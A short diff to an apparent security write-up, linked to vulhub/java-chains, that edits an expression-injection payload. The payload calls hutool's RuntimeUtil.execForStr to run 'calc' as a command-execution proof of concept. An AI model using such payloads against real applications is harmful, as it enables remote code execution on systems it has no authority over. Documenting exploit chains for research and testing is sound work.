@@ -24,7 +24,7 @@ https://github.com/vulhub/java-chains
 <img width="1873" height="827" alt="image" src="https://github.com/user-attachments/assets/56faf2ee-e03f-463b-aeda-2efa13ebd309" />
 
 ```java
-use cn.hutool.core.util.*;RuntimeUtil.execForStr(seq.array(java.lang.String, "calc"))
+=use cn.hutool.core.util.*;RuntimeUtil.execForStr(seq.array(java.lang.String, "calc"))
 ```
 Because of the hutool-core dependency, the built-in `RuntimeUtil.execForStr` method can be used to execute commands.
 <img width="1872" height="853" alt="image" src="https://github.com/user-attachments/assets/47c6e757-983e-4da7-b00f-162b2adbda4f" />
